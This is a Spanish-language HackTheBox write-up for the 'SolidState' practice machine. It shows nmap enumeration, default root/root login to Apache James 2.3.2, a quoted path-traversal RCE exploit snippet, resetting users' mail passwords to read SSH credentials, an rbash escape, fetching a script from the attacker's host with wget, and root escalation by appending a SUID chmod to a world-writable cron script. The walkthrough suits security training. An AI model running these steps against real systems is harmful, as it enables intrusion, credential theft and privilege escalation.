---
title: SolidState Writeup
author: Droix3d
date: 30-01-2023 
categories: [HackTheBox Linux, Machines Medium]
tags: [Writeup Guías HackTheBox, Linux ]
pin: false
image:
  path: /assets/img/commons/SolidState/SolidState.png
  alt: SolidState WriteUp
---

10.10.10.51 SolidState (medium machine)

- Comenzamos con la fase de recolección de información haciendo un escaneo por TCP en todos los puertos con nmap 

```console
$ nmap -p-  -sS -vvv  --min-rate 2000 -n -Pn 10.10.10.51 -oG allPorts 

```
-p-  -> escanearemos todos los rangos de puertos (65535)

-sS -> análisis utilizando TCP SYN Este tipo de escaneo, está basado en la velocidad de escaneo, de ahí la versatilidad que mencionamos anteriormente, ya que permite escanear miles de puertos por segundo en una red que se encuentre desprotegida o carezca de un firewall, no termina la conexión TCP/SYN - Envias un SYN - Recibes un SYN/ACK - Envias ResetPacket

-vvv -> verbose para que mediante vayas descubriendo puertos se reporten en la terminal

--min-rate 2000 -> paquetes enviados no mas lentos que 2000 paquetes por segundo, envío de paquetes super rápido

-n -> que no aplique resoluci+on de DNS para que no tarde el escaneo

-Pn -> ni que me detecte el descburimiento de hosts


```console
$ nmap -p-  -sS -vvv  --min-rate 2000 -n -Pn 10.10.10.51 -oG allPorts 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-30 13:18 CST
Initiating SYN Stealth Scan at 13:18
Scanning 10.10.10.51 [65535 ports]
Discovered open port 22/tcp on 10.10.10.51
Discovered open port 110/tcp on 10.10.10.51
Discovered open port 80/tcp on 10.10.10.51
Discovered open port 25/tcp on 10.10.10.51
Discovered open port 4555/tcp on 10.10.10.51
Increasing send delay for 10.10.10.51 from 0 to 5 due to max_successful_tryno increase to 4
Increasing send delay for 10.10.10.51 from 5 to 10 due to max_successful_tryno increase to 5
Increasing send delay for 10.10.10.51 from 10 to 20 due to max_successful_tryno increase to 6
Increasing send delay for 10.10.10.51 from 20 to 40 due to max_successful_tryno increase to 7
Increasing send delay for 10.10.10.51 from 40 to 80 due to 174 out of 578 dropped probes since last increase.
Increasing send delay for 10.10.10.51 from 80 to 160 due to max_successful_tryno increase to 8
Increasing send delay for 10.10.10.51 from 160 to 320 due to 73 out of 243 dropped probes since last increase.
Increasing send delay for 10.10.10.51 from 320 to 640 due to 124 out of 413 dropped probes since last increase.
Increasing send delay for 10.10.10.51 from 640 to 1000 due to 142 out of 472 dropped probes since last increase.
Warning: 10.10.10.51 giving up on port because retransmission cap hit (10).
Discovered open port 119/tcp on 10.10.10.51
Completed SYN Stealth Scan at 13:19, 43.42s elapsed (65535 total ports)
Nmap scan report for 10.10.10.51
Host is up, received user-set (0.077s latency).
Scanned at 2023-01-30 13:18:16 CST for 44s
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
25/tcp   open  smtp    syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
110/tcp  open  pop3    syn-ack ttl 63
119/tcp  open  nntp    syn-ack ttl 63
4555/tcp open  rsip    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 43.52 seconds
           Raw packets sent: 86792 (3.819MB) | Rcvd: 80877 (3.235MB)

``` 

puerto 80 por lo tanto vamos a darle un visto al sitio web pero realmente nada importante incluso viendo con wappalyzer o whatweb las tecnologias que emplea realmente no hay nada del otro mundo 


![](/assets/img/commons/SolidState/web.png)


```console

$ whatweb http://10.10.10.51
http://10.10.10.51 [200 OK] Apache[2.4.25], Country[RESERVED][ZZ], Email[webadmin@solid-state-security.com], HTML5, HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[10.10.10.51], JQuery, Script, Title[Home - Solid State Security]

```
 me copiare esos puertos abiertos para analizar servicios y versiones que corren en ellos

```console 
$ nmap -sCV -p22,25,80,110,119,4555 10.10.10.51 -oN targeted

Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-30 20:46 CST
Stats: 0:00:50 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 83.33% done; ETC: 20:47 (0:00:10 remaining)
Stats: 0:01:05 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 83.33% done; ETC: 20:48 (0:00:13 remaining)
Stats: 0:02:44 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.68% done; ETC: 20:49 (0:00:00 remaining)
Nmap scan report for 10.10.10.51
Host is up (0.15s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 770084f578b9c7d354cf712e0d526d8b (RSA)
|   256 78b83af660190691f553921d3f48ed53 (ECDSA)
|_  256 e445e9ed074d7369435a12709dc4af76 (ED25519)
25/tcp   open  smtp    JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.8 [10.10.14.8])
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Home - Solid State Security
|_http-server-header: Apache/2.4.25 (Debian)
110/tcp  open  pop3    JAMES pop3d 2.3.2
119/tcp  open  nntp    JAMES nntpd (posting ok)
4555/tcp open  rsip?
| fingerprint-strings: 
|   GenericLines: 
|     JAMES Remote Administration Tool 2.3.2
|     Please enter your login and password
|     Login id:
|     Password:
|     Login failed for 
|_    Login id:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4555-TCP:V=7.93%I=7%D=1/30%Time=63D8812D%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,7C,"JAMES\x20Remote\x20Administration\x20Tool\x202\.3\.2\nPl
SF:ease\x20enter\x20your\x20login\x20and\x20password\nLogin\x20id:\nPasswo
SF:rd:\nLogin\x20failed\x20for\x20\nLogin\x20id:\n");
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 264.55 seconds
```
-sCV -> escaneo lanzando scripts que detecten servicios y versiones

-p -> especeficando los puertos a escanear

-oN y todo nuestro output lo guardamos en una captura formato nmap con el nombre de targeted

Indagando mas sobre el puerto 4555 tenemos un apache James que corresponde a una versión bastante vulnerable, leyendo acerca de la explotación nos menciona que *Apache James normalmente almacena los datos de ese usuario en un subdirectorio relativo a su directorio de instalación, en "apps/james/var/users". De forma predeterminada, el servidor crea un nuevo subdirectorio para almacenar el correo electrónico entrante y saliente de cada usuario.* este mecanismo de creación de directorios es susceptible a una vulnerabilidad, lo que permite a un atacante ejecutar comandos arbitrarios en la máquina del servidor de correo. los nombres de usuario no están suficientemente validados en el momento de la creación del usuario, y anteponer una serie del símbolo del directorio principal, "../", hace que el servidor cree un directorio de usuario fuera del directorio de instalación. Un nombre de usuario como "../../../../../../../../etc/bash_completion.d" puede hacer que los archivos se coloquen en "/etc/bash_completion.d,"

si buscamos con searchsploit tenemos un script en python donde nos automatiza la intrusión creando el usuario 

![](/assets/img/commons/SolidState/exploit.png)


```python
s.send("adduser ../../../../../../../../etc/bash_completion.d exploit\n")
s.recv(1024)
s.send("quit\n")
s.close()
print "[+]Connecting to James SMTP server..."
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((ip,25))
s.send("ehlo team@team.pl\r\n")
recv(s)
print "[+]Sending payload..."
s.send("mail from: <'@team.pl>\r\n")
recv(s)
# also try s.send("rcpt to: <../../../../../../../../etc/bash_completion.d@hostname>\r\n") if the recipient cannot be found
s.send("rcpt to: <../../../../../../../../etc/bash_completion.d>\r\n")
recv(s)
```
vemos que crea el usuario antes mencionado para tener un RCE aprovechandose en esta vulnerabilidad de la creación de directorios que emplea al añadir un usuario, pero hay un problema. tiene que estar logueada y activa una persona para que active el RCE del usuario creado, asi que si lo ejecutamos no tendriamos éxito. Sin embargo en la parte superior del script vemos unas credenciales por defecto para logearnos a este servicio 

```python
# credentials to James Remote Administration Tool (Default - root/root)
user = 'root'
pwd = 'root'
```
asi que intentare conectarme por netcat a ese puerto y efectivamente nos pide unas credenciales, solo ponemos las que nos vienen por defecto y estamos dentro

```console
$ nc 10.10.10.51 4555
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
help
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection
```
en este punto listare los usuarios y cambiare sus respectivas contraseñas para ver si logueandome por telnet al puerto 110 llego a ver algo que corre pop3 (protocolo de transeferencia de correos)

```console
listusers
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
setpassword james 12345
Password for james reset
setpassword thomas 12345
Password for thomas reset
setpassword john 12345
Password for john reset
setpassword mindy 12345
Password for mindy reset
setpassword mailadmin 12345               
Password for mailadmin reset
```
una vez cambiada las credenciales procederé a conectarme por telnet, checando con cada uno de los usuarios veo que no tienen nada importante a excepción de mindy que tiene dos correos y uno de ellos nos setea una contraseña

```console
$ telnet 10.10.10.51 110  
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER mindy
+OK
PASS 12345
+OK Welcome mindy
LIST
+OK 2 1945
1 1109
2 836
.
RETR 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James
.
```
el correo nos dice que a mindy le acaban de dar acceso al sistema de ssh y recordamos que tiene el puerto 22 expuesto, pero hay un problema. su ruta del PATH no esta totalmente asi que nos costara y buscaremos la forma de ejecutar comando en el sistema

**mindy:P@55W0rd1!2@**

al validar la contraseña con sshpass nos conectamos por ssh directamente y efectivamente mindy no ha cambiado su password que le dieron por defecto y obtenemos la primera flag 

```console
sshpass -p 'P@55W0rd1!2@' ssh -o 'StrictHostKeyChecking=no' mindy@10.10.10.51     
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142
mindy@solidstate:~$ ls
bin  user.txt
mindy@solidstate:~$ cat user.txt 
87e11ac003837fd5250c29ff94a271d6
```
### Privilege Escalation 

si intentamos ejecutar otro comando fuera de los que admite vemos que no nos deja

mindy@solidstate:~$ whoami
-rbash: whoami: command not found

ahora miramos su ruta del PATH Y pues si que no hay muchas opciones de donde podemos ejecutar comandos ya que no estan contempladas todas las rutas al sistema raiz, por lo tanto copiare la mia y la importare a la suya 

mindy@solidstate:~$ echo $PATH
/home/mindy/bin

pero no llegamos a tener éxito ya que estamos en una restricted bash y nos limita a mucho

mindy@solidstate:~$ export PATH=$PATH:/root/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/go/bin/:/root/go-workspace/bin:/root/.fzf/bin
-rbash: PATH: readonly variable

lo que tratare de hacer es ver si despues del login de ssh puedo lanzar un comando y dicho comando me lo logra interpretar, probaré con el comando id para ver si en el output despues del login me lo acepta

```console
$ sshpass -p 'P@55W0rd1!2@' ssh -o 'StrictHostKeyChecking=no' mindy@10.10.10.51 id
uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)
```
y vemos que tenemos éxito por lo tanto solo nos queda lanzarnos una bash y hacer el tratamiento de la tty para tener la consola mas interactiva

```console
$ sshpass -p 'P@55W0rd1!2@' ssh -o 'StrictHostKeyChecking=no' mindy@10.10.10.51 bash
whoami
mindy
script /dev/null -c bash
Script started, file is /dev/null
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ echo $TERM
echo $TERM
dumb
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ echo $SHELL
echo $SHELL
/bin/rbash
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ export TERM=xterm 
export TERM=xterm
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ export SHELL=bash
export SHELL=bash
```
ahora si ya podemos manejarnos mas facilmente por la terminal con todos los comandos, me meteré al directorio tmp para hacer un script en bash para visualizar las tareas y que comandos son los que van entrando y saliendo del sistema

```bash
#!/bin/bash

old_process=$(ps -eo command)

while true; do
          new_process=$(ps -eo command)
          diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -v "procmon.sh" | grep -v "command"
          old_process=$new_process
done
```
esto nos dirá los nuevos procesos y comandos entrante en un periodo de tiempo que se esten ejecutando en el sistema

```console
${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ wget http://10.10.14.8/procmon.sh
procmon.sh//10.10.14.8/p
--2023-01-30 22:55:40--  http://10.10.14.8/procmon.sh
Connecting to 10.10.14.8:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 259 [text/x-sh]
Saving to: ‘procmon.sh’

procmon.sh          100%[===================>]     259  --.-KB/s    in 0s      

2023-01-30 22:55:40 (20.9 MB/s) - ‘procmon.sh’ saved [259/259]

${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ chmod +x procmon.sh
chmod +x procmon.sh
```
le damos permisos de ejecución y esperamos a que nos salga un nuevo proceso ejecutado

```console
${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ ./procmon.sh
./procmon.sh
> /usr/sbin/CRON -f
< /usr/sbin/CRON -f
> /usr/sbin/CRON -f
> /bin/sh -c python /opt/tmp.py
< /usr/sbin/CRON -f
< /bin/sh -c python /opt/tmp.py

```
depués de unos minutos visulizamos un proceso bastante intersante que ejecuta un script en python, si visualizamos los permisos vemos que el propietario es root 

${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ls -l /opt/tmp.py

-rwxrwxrwx 1 root root 105 Aug 22  2017 /opt/tmp.py

ahora visualizare el script... y !BINGOO tenemos permisos de lectura escritura y ejecución con una funcion **os.system** donde podemos enviar nuestra consola y otorgar permisos SUID a la bash y asi escalar nuestro privilegio

${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ cat /opt/tmp.py

```python
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()
```
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ echo "os.system('chmod u+s /bin/bash')" >> /opt/tmp.py

guardando nuestra llamada al sistema del script en python esperare a que la tarea se vuelva a ejecutar y tener permisos SUID en la bash

```python
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()

os.system('chmod u+s /bin/bash')
```
después de esperar a que se ejecute logramos tener los privilegios en la bash , solo hace falta poner bash -p (-p de privilege) y listo, somos root y máquina completada :D!!

```console
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ls -l /bin/bash
ls -l /bin/bash
-rwsr-xr-x 1 root root 1265272 May 15  2017 /bin/bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ bash -p
bash -p
bash-4.4# whoami
whoami
root
bash-4.4# cat /root/root.txt
cat /root/root.txt
4ea15b06b3c027ecfd661b3580dddd9f
```
